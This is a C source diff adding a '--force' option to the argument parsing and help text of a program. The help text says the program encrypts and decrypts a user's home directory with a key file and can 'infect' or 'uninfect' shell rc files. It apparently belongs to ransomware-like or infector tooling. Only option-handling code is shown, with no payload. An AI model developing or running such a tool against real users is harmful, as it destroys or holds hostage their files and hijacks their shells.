@@ -29,8 +29,9 @@ const char *rc_files[] = {".bashrc", ".zshrc", NULL};
 void help(void) {
 	printf("%s - %s\n\n", PROGRAM_NAME, PROGRAM_DESC);
 	printf("Usage example:\n");
-	printf("%s [(-h|--help)] [(-v|--verbose)] [(-V|--version)] "
-		"[(-k|--key) keyfile] "
+	printf("%s [(-h|--help)] [(-V|--version)] "
+		"[(-v|--verbose)] [(-t|--test)] "
+		"[(-f|--force)] [(-k|--key) keyfile] "
 		"[(-e|--encrypt) keyfile] [(-d|--decrypt) keyfile] "
 		"[(-p|--print)] [(-i|--infect)] [(-u|--uninfect)]\n\n",
 		PROGRAM_NAME);
@@ -39,6 +40,7 @@ void help(void) {
 	printf("-V or --version: Displays the current version number.\n");
 	printf("-v or --verbose: Verbose mode on.\n");
 	printf("-t or --test: Do not delete or alter files.\n");
+	printf("-f or --force: Overwrite files even if they exist.\n");
 	printf("-k or --key: Create random key and write it to a file.\n");
 	printf("-e or --encrypt keyfile: Encrypt user home using a key file.\n");
 	printf("-d or --decrypt keyfile: Decrypt user home using a key file.\n");
@@ -71,13 +73,14 @@ int main(int argc, char **argv) {
 	char *opt_decrypt_file = NULL;
 
 	int next_option;
-	const char* const short_options = "hVvtk:e:d:piu";
+	const char* const short_options = "hVvtfk:e:d:piu";
 	const struct option long_options[] =
 	{
 		{ "help",	0, NULL, 'h' },
 		{ "version",	0, NULL, 'V' },
 		{ "verbose",	0, NULL, 'v' },
 		{ "test",	0, NULL, 't' },
+		{ "force",	0, NULL, 'f' },
 		{ "key",	1, NULL, 'k' },
 		{ "encrypt",	1, NULL, 'e' },
 		{ "decrypt",	1, NULL, 'd' },
@@ -106,6 +109,9 @@ int main(int argc, char **argv) {
 			break;
 		case 't':
 			baumcommon_settest(1);
+			break;
+		case 'f':
+			baumcommon_setforce(1);
 			break;
 		case 'k':
 			opt_key = 1;
